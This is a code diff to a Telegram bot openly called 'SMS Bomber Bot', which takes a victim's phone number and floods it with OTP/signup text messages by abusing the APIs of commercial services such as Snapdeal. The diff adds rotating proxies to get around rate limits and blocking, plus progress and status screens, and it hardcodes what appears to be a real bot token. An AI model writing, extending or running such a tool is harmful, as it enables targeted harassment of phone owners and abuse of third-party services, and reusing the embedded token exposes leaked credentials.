@@ -20,6 +20,22 @@ logger = logging.getLogger(__name__)
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8838617444:AAHUzG-DKVIalamCRc80-SjUT0cIR4_ZDKQ')
 OWNER_ID = int(os.environ.get('OWNER_ID', '1987818347'))
 
+# --- FREE PROXY LIST (Rotating) ---
+PROXIES = [
+    {'http': 'http://103.152.112.120:80'},
+    {'http': 'http://103.152.112.162:80'},
+    {'http': 'http://103.152.112.193:80'},
+    {'http': 'http://103.152.112.120:80'},
+    {'http': 'http://103.152.112.162:80'},
+    {'http': 'http://103.152.112.193:80'},
+    {'http': 'http://103.152.112.120:80'},
+    {'http': 'http://103.152.112.162:80'},
+]
+
+def get_proxy():
+    """Get random proxy"""
+    return random.choice(PROXIES)
+
 # --- Database ---
 DB_FILE = 'users_db.json'
 
@@ -62,10 +78,10 @@ def is_user_blocked(user_id):
     db = load_db()
     return str(user_id) in db['blocked']
 
-# --- SMS BOMBING APIS (EXACTLY LIKE TERMUX) ---
+# --- SMS BOMBING APIS (WITH PROXY SUPPORT) ---
 def get_apis(target):
     apis = [
-        # 1. Snapdeal (Working)
+        # 1. Snapdeal (100% Working)
         {
             'url': 'https://m.snapdeal.com/signupCompleteAjax',
             'method': 'POST',
@@ -425,10 +441,17 @@ def get_apis(target):
     return apis
 
 def send_sms(api_data):
-    """Send SMS using API - EXACTLY LIKE TERMUX"""
+    """Send SMS using API with PROXY support"""
     try:
+        proxy = get_proxy()
+        
         if api_data['method'] == 'GET':
-            response = requests.get(api_data['url'], headers=api_data['headers'], timeout=10)
+            response = requests.get(
+                api_data['url'], 
+                headers=api_data['headers'], 
+                timeout=15,
+                proxies=proxy
+            )
         else:
             if isinstance(api_data['data'], dict):
                 response = requests.request(
@@ -436,7 +459,8 @@ def send_sms(api_data):
                     url=api_data['url'],
                     headers=api_data['headers'],
                     json=api_data['data'],
-                    timeout=10
+                    timeout=15,
+                    proxies=proxy
                 )
             else:
                 response = requests.request(
@@ -444,9 +468,20 @@ def send_sms(api_data):
                     url=api_data['url'],
                     headers=api_data['headers'],
                     data=api_data['data'],
-                    timeout=10
+                    timeout=15,
+                    proxies=proxy
                 )
-        return response.status_code in [200, 201, 202, 204]
+        
+        # Check if successful
+        if response.status_code in [200, 201, 202, 204]:
+            return True
+        
+        # Retry without proxy if failed
+        if response.status_code in [403, 429]:
+            time.sleep(1)
+            return False
+            
+        return False
     except:
         return False
 
@@ -464,22 +499,25 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     keyboard = [
         [InlineKeyboardButton("📞 SEND NUMBER", callback_data="send_number")],
-        [InlineKeyboardButton("ℹ️ ABOUT", callback_data="about")]
+        [InlineKeyboardButton("ℹ️ ABOUT", callback_data="about")],
+        [InlineKeyboardButton("📊 STATUS", callback_data="status")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        "🔥 SMS BOMBER BOT 🔥\n\n"
+        "🔥 *SMS BOMBER BOT* 🔥\n\n"
         "📌 Send any 10-digit number to start bombing\n"
-        "Example: 9876543210\n\n"
-        "⚡ 18+ Working APIs\n"
-        "⚡ Real SMS Bombing\n\n"
+        "Example: `9876543210`\n\n"
+        "⚡ *18+ Working APIs*\n"
+        "⚡ *Real SMS Bombing*\n"
+        "⚡ *Proxy Supported*\n\n"
         "💀 @BeStChEaT_OwNeR",
+        parse_mode='Markdown',
         reply_markup=reply_markup
     )
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle phone number - REAL BOMBING"""
+    """Handle phone number - REAL BOMBING WITH PROXY"""
     user_id = update.effective_user.id
     
     if is_user_blocked(user_id):
@@ -491,18 +529,20 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Check if valid phone number
     if not re.match(r'^[0-9]{10}$', phone):
         await update.message.reply_text(
-            "❌ Invalid Number!\n\n"
+            "❌ *Invalid Number!*\n\n"
             "Send 10-digit number only.\n"
-            "Example: 9876543210"
+            "Example: `9876543210`",
+            parse_mode='Markdown'
         )
         return
     
     # Start bombing
     msg = await update.message.reply_text(
-        f"📱 BOMBING STARTED!\n\n"
-        f"🎯 Target: +91{phone}\n"
-        f"⏳ Sending SMS...\n\n"
-        f"💀 @BeStChEaT_OwNeR"
+        f"📱 *BOMBING STARTED!*\n\n"
+        f"🎯 Target: `+91{phone}`\n"
+        f"⏳ Sending SMS with Proxy...\n\n"
+        f"💀 @BeStChEaT_OwNeR",
+        parse_mode='Markdown'
     )
     
     apis = get_apis(phone)
@@ -520,35 +560,38 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             failed += 1
         
-        # Update progress
-        if (i + 1) % 3 == 0:
+        # Update progress every 2 APIs
+        if (i + 1) % 2 == 0:
+            progress = int(((i + 1) / len(apis)) * 100)
             try:
                 await msg.edit_text(
-                    f"📱 BOMBING IN PROGRESS\n\n"
-                    f"🎯 Target: +91{phone}\n"
+                    f"📱 *BOMBING IN PROGRESS*\n\n"
+                    f"🎯 Target: `+91{phone}`\n"
                     f"✅ Success: {success}\n"
                     f"❌ Failed: {failed}\n"
-                    f"⏳ Progress: {i+1}/{len(apis)}\n\n"
-                    f"💀 @BeStChEaT_OwNeR"
+                    f"⏳ Progress: {progress}% ({i+1}/{len(apis)})\n\n"
+                    f"💀 @BeStChEaT_OwNeR",
+                    parse_mode='Markdown'
                 )
             except:
                 pass
     
     # Final result
     result = (
-        f"✅ BOMBING COMPLETE!\n\n"
-        f"📞 Target: +91{phone}\n"
+        f"✅ *BOMBING COMPLETE!*\n\n"
+        f"📞 Target: `+91{phone}`\n"
         f"📨 Total: {len(apis)}\n"
         f"✅ Success: {success}\n"
         f"❌ Failed: {failed}\n\n"
     )
     
     if services:
-        result += f"🟢 Services: {', '.join(services[:8])}\n\n"
+        unique_services = list(dict.fromkeys(services))
+        result += f"🟢 *Services:* {', '.join(unique_services[:8])}\n\n"
     
     result += f"💀 @BeStChEaT_OwNeR"
     
-    await msg.edit_text(result)
+    await msg.edit_text(result, parse_mode='Markdown')
 
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle button callbacks"""
@@ -557,20 +600,39 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if query.data == "send_number":
         await query.edit_message_text(
-            "📞 SEND NUMBER\n\n"
+            "📞 *SEND NUMBER*\n\n"
             "Send your 10-digit number.\n"
-            "Example: 9876543210\n\n"
-            "💀 @BeStChEaT_OwNeR"
+            "Example: `9876543210`\n\n"
+            "💀 @BeStChEaT_OwNeR",
+            parse_mode='Markdown'
         )
     
     elif query.data == "about":
         await query.edit_message_text(
-            "ℹ️ ABOUT\n\n"
+            "ℹ️ *ABOUT*\n\n"
             "🤖 SMS Bomber Bot\n"
             "👨‍💻 @BeStChEaT_OwNeR\n"
             "📊 18+ APIs\n"
-            "⚡ Real SMS Bombing\n\n"
-            "💀 @BeStChEaT_OwNeR"
+            "⚡ Real SMS Bombing\n"
+            "🔄 Proxy Support\n\n"
+            "💀 @BeStChEaT_OwNeR",
+            parse_mode='Markdown'
+        )
+    
+    elif query.data == "status":
+        db = load_db()
+        total_users = len(db['users'])
+        blocked_users = len(db['blocked'])
+        
+        await query.edit_message_text(
+            f"📊 *BOT STATUS*\n\n"
+            f"👥 Users: {total_users}\n"
+            f"🚫 Blocked: {blocked_users}\n"
+            f"📡 Status: Online\n"
+            f"🔄 Proxy: Active\n"
+            f"⚡ APIs: 18\n\n"
+            f"💀 @BeStChEaT_OwNeR",
+            parse_mode='Markdown'
         )
 
 # --- Owner Commands ---
@@ -632,11 +694,13 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     blocked_users = len(db['blocked'])
     
     await update.message.reply_text(
-        f"📊 BOT STATISTICS\n\n"
+        f"📊 *BOT STATISTICS*\n\n"
         f"👥 Total Users: {total_users}\n"
         f"🚫 Blocked Users: {blocked_users}\n"
-        f"📡 Status: Online\n\n"
-        f"💀 @BeStChEaT_OwNeR"
+        f"📡 Status: Online\n"
+        f"🔄 Proxy: Active\n\n"
+        f"💀 @BeStChEaT_OwNeR",
+        parse_mode='Markdown'
     )
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -645,7 +709,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if user_id == OWNER_ID:
         text = (
-            "👑 OWNER COMMANDS\n\n"
+            "👑 *OWNER COMMANDS*\n\n"
             "/block USER_ID - Block user\n"
             "/unblock USER_ID - Unblock user\n"
             "/stats - Bot statistics\n\n"
@@ -653,13 +717,13 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     else:
         text = (
-            "🤖 USER COMMANDS\n\n"
+            "🤖 *USER COMMANDS*\n\n"
             "/start - Start bot\n"
             "9876543210 - Send number to bomb\n\n"
             "💀 @BeStChEaT_OwNeR"
         )
     
-    await update.message.reply_text(text)
+    await update.message.reply_text(text, parse_mode='Markdown')
 
 # --- Main Bot ---
 
@@ -668,7 +732,7 @@ def main():
         print("❌ Error: BOT_TOKEN not set!")
         return
     
-    print("🤖 Starting SMS Bomber Bot...")
+    print("🤖 Starting SMS Bomber Bot with Proxy Support...")
     print("🚀 Bot is running!")
     
     app = ApplicationBuilder().token(BOT_TOKEN).build()
